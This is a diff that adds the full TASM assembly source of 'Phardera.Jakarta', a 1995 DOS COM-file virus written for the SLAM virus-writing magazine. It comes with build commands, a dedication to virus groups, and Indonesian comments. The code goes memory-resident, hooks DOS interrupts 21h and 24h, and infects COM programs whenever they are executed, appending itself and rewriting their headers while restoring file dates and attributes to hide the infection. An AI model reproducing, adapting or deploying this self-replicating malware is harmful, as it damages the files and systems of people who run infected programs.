@@ -1,0 +1,428 @@
+comment~
+-------------------------------------------------------
+ Phardera.Jakarta
+ Small COM Virus for Beginner Level
+
+ Assembled with:
+   TASM JAKARTA.ASM /M
+   TLINKS JAKARTA.OBJ /X
+   EXE2BIN JAKARTA.EXE JAKARTA.COM
+   DEL JAKARTA.EXE
+
+ Created by Phardera, The Indonesian Virus Writer
+ First written in the city of Bandung, West Java.
+ Revision in the city of Jakarta for [SLAM] Magazine.
+
+ (x)1995 by Phardera <phardera@hotmail.com>
+-------------------------------------------------------
+~
+
+;=[ SLAM ]===============================================
+;                                                       ;
+; Special for [SLAM] Magazine and All of SLAMers        ;
+; Greetings to: Neophyte, Nightmare Joker, Dark Night,  ;
+;               Aurodreph, Cicatrix, Medan Alphaz,      ;
+;               Falcon, Mr.Sandman, VBB, SLAM, and 29A. ;
+;                                                       ;
+;========================================================
+
+; BuatAnjingBanciDiJakarta!
+
+
+virus_size = offset(eov-start)
+mem_size = offset(eom-start)
+
+; reserved for future version (EXE)
+header_exe struc
+  kodeexe   dw ?  ;00                    
+  image1    dw ?  ;02
+  image2    dw ?  ;04
+  count     dw ?  ;06
+  headsize  dw ?  ;08
+  minmem    dw ?  ;0A
+  maxmem    dw ?  ;0C
+  ss_rec    dw ?  ;0E
+; sp_rec    dw ?  ;10    ; reserved for EXE
+; chksum    dw ?  ;12    ; reserved for EXE           
+; ip_rec    dw ?  ;14    ; reserved for EXE
+; cs_rec    dw ?  ;16    ; reserved for EXE
+; new_exe   dw ?  ;18    ; reserved for EXE
+ends ;header_exe
+
+; buffer
+old_buf struc
+  i21       dd ?   
+  i24       dd ?   
+  attr      dw ?
+  time      dw ?
+  date      dw ?
+  file      dd ?   
+ends ;old_buf
+
+      locals
+     .model small
+     .code
+     org 0
+
+start:
+      call position
+
+position:
+      pop   bp
+      sub   bp,offset position   ; SS:BP
+      push  ax ds es
+
+      jmp   check_in_memory
+
+oldhdr header_exe <00E9h,0CD00h,0020h>
+
+      db '(c)Sep95 by Phardera'
+
+check_virus proc near
+;* ambil alamat nama file untuk dibaca
+      push  cs
+      pop   es
+      lea   di,[old.file]
+      mov   ax,dx
+      stosw
+      mov   ax,ds
+      stosw
+
+;* simpan int 24h
+      xor   ax,ax
+      mov   ds,ax
+      mov   si,24h*4
+      lea   di,[old.i24]
+      movsw
+      movsw
+
+;* set int 24h ke virus
+      push  cs
+      pop   ds
+      mov   ax,2524h                ; !
+      lea   dx,[new_24]
+      call  Int21                   ; DOS Services  ah=function 25h
+                                    ;  set intrpt vector al to ds:dx
+
+;* buka file untuk di-baca
+      lds   dx,[old.file]
+      mov   ax,3D00h
+      call  Int21                   ; DOS Services  ah=function 3Dh
+                                    ;  open file, al=mode,name@ds:dx
+      jnc   read_header             ; Jump if carry=0
+      jmp   jangan_serang
+
+;* baca header file sebanyak 3 byte
+read_header:
+      push  cs cs
+      pop   ds es
+      mov   bx,ax                   ; bx = ax = handle
+
+;* ke awal file
+      xor   cx,cx
+      mov   ax,4200h
+      cwd
+      call  Int21                   ; DOS Services  ah=function 42h
+                                    ;  move file ptr, bx=file handle
+                                    ;   al=method, cx,dx=offset
+
+;* mulai baca header 12 byte
+      lea   dx,[bufhdr]             ; isi bufhdr
+      mov   cx,size header_exe      ; 12 byte
+      mov   ah,3Fh                  
+      call  Int21                   ; DOS Services  ah=function 3Fh
+                                    ;  read file, bx=file handle
+                                    ;   cx=bytes to ds:dx buffer
+;* terkena virus?
+      mov   di,dx
+      mov   al,0E9h
+      scasb
+      jne   jangan_serang
+      scasw
+      mov   ax,6850h
+      scasw
+      je    jangan_serang
+
+;* size file
+      xor   cx,cx                   ; Zero register
+      mov   ax,4202h
+      cwd
+      call  Int21                   ; DOS Services  ah=function 42h
+                                    ;  move file ptr, bx=file handle
+                                    ;   al=method, cx,dx=offset
+      cmp   ax,(0FFFFh-100h-2-virus_size)+10h
+      jbe   belum_ada
+
+
+jangan_serang:
+      mov   ah,3Eh
+      call  Int21
+      xor   al,al                   ; jangan serang
+      jmp   checkexit
+            
+belum_ada:
+      mov   ah,3Eh
+      call  Int21
+      mov   al,1                    ; ya, infeksikan
+
+checkexit:
+      ret
+;!! interrupt 24h belum di-restore
+check_virus endp
+
+infection_file proc near
+      call  pushall
+      cld
+      call  check_virus             ; terinfeksi?
+      ;!! Int 24h belum direstore
+      ;!! bufhdr telah terisi
+      ;!! ds <> cs
+      ;or    al,al                   ; 0 jangan, 1 = serang
+      cmp   al,0
+      jnz   @@1
+      jmp   restore_regs
+
+;* mulai infeksikan virus
+@@1:
+;* get atrribut file (cs:)
+      lds   dx,cs:[old.file]
+      mov   ax,4300h
+      call  Int21
+      mov   cs:[old.attr],cx
+
+;* set atrribut normal
+      xor   cx,cx
+      mov   ax,4301h
+      call  Int21
+      jc    @@2                     ; gagal set attr
+
+;* open file for read/write
+      mov   ax,3D02h
+      call  Int21
+      jnc   get_ftime
+
+@@2:
+      jmp   restore_attr
+
+get_ftime:
+      push  cs cs
+      pop   ds es
+      mov   bx,ax                   ; bx = handle
+
+;* simpan waktu dan tanggal file
+      mov   ax,5700h
+      call  Int21      
+      lea   di,[old.time]
+      mov   ax,cx
+      stosw
+      mov   ax,dx
+      stosw
+
+;* simpan header file asli
+      mov   cx,(size header_exe)/2  ; 32 byte /2
+      lea   si,[bufhdr]             ; dari rutin checkvirus
+      mov   ax,si
+      lea   di,[oldhdr]
+      cld
+      rep   movsw
+
+      xchg  di,ax
+
+;* pindahkan pointer ke akhir file untuk data jmp
+      xor   cx,cx
+      mov   ax,4202h
+      cwd       
+      call  Int21
+
+;* relokasi jmp
+      sub   ax,3
+      push  ax
+      mov   al,0E9h
+      stosb
+      pop   ax
+      stosw
+      mov   ax,6850h      
+      stosw
+      mov   ax,7261h      
+      stosw
+      mov   ax,6564h      
+      stosw
+      mov   ax,6172h      
+      stosw
+      mov   al,21h
+      stosb
+
+;* tulis virus ke file
+      mov   cx,virus_size
+      mov   ah,40h
+      cwd                           ; DS:0000h
+      call  Int21                   ; DOS Services  ah=function 40h
+                                    ;  write file  bx=file handle
+                                    ;  cx=bytes from ds:dx buffer
+      jnc   @@4
+      cmp   ax,cx
+      jnb   @@4                     ; disk full!
+      jmp   restore_ftime           ;(restore atribut & time)
+
+;* pindahkan pointer ke awal file untuk penulisan header virus
+@@4:
+      xor   cx,cx                                    
+      mov   ax,4200h
+      cwd
+      call  Int21                   ; DOS Services  ah=function 42h
+                                    ;  move file ptr, bx=file handle
+                                    ;   al=method, cx,dx=offset
+
+;* tulis header manipulasi ke file terinfeksi
+      mov   ah,40h                
+      mov   cx,size header_exe      ; 32 byte
+      lea   dx,[bufhdr]             ; buffer header 
+      call  Int21                   ; DOS Services  ah=function 40h
+                                    ;  write file  bx=file handle
+                                    ;   cx=bytes from ds:dx buffer
+
+;* kembalikan waktu dan tanggal file asli
+restore_ftime:
+      lea   si,[old.time]
+      lodsw
+      xchg  cx,ax
+      lodsw
+      xchg  dx,ax
+      mov   ax,5701h
+      call  Int21                   
+
+      mov   ah,3Eh
+      call  Int21                     ; close file
+
+restore_attr:
+      mov   cx,cs:[old.attr]
+      lds   dx,cs:[old.file]
+      mov   ax,4301h
+      call  Int21
+
+restore_regs:     
+      lds   dx,cs:[old.i24]
+      mov   ax,2524h
+      call  Int21
+      call  popall
+      ret                           ; kembali ke new_21
+infection_file endp
+
+new_24:
+      xor   al,al
+      iret
+
+new_21 proc far                     ; inter segment
+      sti
+      cmp   ax,0FACEh
+      je    is_active
+      cmp   ah,4Bh
+      jne   @@1
+      call  infection_file
+@@1:
+      jmp   old_21
+
+;* telah aktif di memori
+is_active:
+      mov   ax,0DEADh
+      iret                          ; interrupt return
+new_21 endp
+
+Int21 proc near
+      pushf
+      call  4 ptr cs:[old.i21]
+      ret
+Int21 endp
+
+pushall proc near
+      pop   bp
+      pushf
+      push  ax bx cx dx si di ds es bp
+      ret
+pushall endp
+
+popall proc near
+      pop   bp es ds di si dx cx bx ax
+      popf
+      push  bp
+      ret
+popall endp
+      
+; 1st Install
+check_in_memory:
+      mov   ax,0FACEh
+      int   21h
+      cmp   ax,0DEADh
+      je    ready_in_memory
+      call  allocate_memory         ; go resident
+
+ready_in_memory:
+;* telah aktif di memori
+;* jalankan program asli            ; restore old header
+      pop   es ds ax
+      lea   si,[oldhdr][bp]
+      mov   di,100h
+      push  di
+      mov   cx,(size header_exe)/2  ; 32 byte/2
+      rep   movsw
+      ret                           ; JMP 100h (from PUSH DI)
+
+allocate_memory proc near
+;* alokasikan memori
+@@1:
+      ;!10h
+      mov   ah,48h
+      mov   bx,(mem_size+0Fh)/10h                                   
+      int   21h                    
+      jnc   resident                ; dapat lokasi di memori
+      mov   ax,ds
+      dec   ax
+      mov   ds,ax                   ; get MCB = SEG - 1
+      mov   bx,2 ptr ds:[3]       
+
+;* kurangi size memori
+      sub   bx,(mem_size+1Fh)/10h
+      mov   ah,4Ah
+      int   21h                                                     
+      jmp   @@1                  
+
+      db 'Jakarta - Indonesia'
+      
+resident:
+      dec   ax
+      mov   es,ax                    
+      mov   2 ptr es:[1],8          ; MCB owner = CONFIG.SYS
+      inc   ax
+      mov   es,ax                   ; ambil segment virus di memori
+      mov   si,bp
+      xor   di,di
+      mov   cx,virus_size           ; sebesar ukuran virus
+      cld                          
+      rep   segcs movsb             ; letakkan virus ke memori
+
+;* intercept int 21h
+;* set DS ke segment virus di memori
+      push  es
+      xor   ax,ax
+      mov   ds,ax
+      mov   si,21h*4
+      lea   di,[old.i21]
+      movsw
+      movsw
+
+;* set int 21h ke pencegat
+      pop   ds
+      mov   ax,2521h               
+      lea   dx,[new_21]
+      int   21h                     ; DOS Services  ah=function 25h
+                                    ;  set intrpt vector al to ds:dx
+      ret                           ; kembalikan asli
+allocate_memory endp
+
+old_21:
+       db   0EAh                    ; jump far
+eov:
+       old  old_buf ?
+       bufhdr header_exe ?
+eom:
+end start  
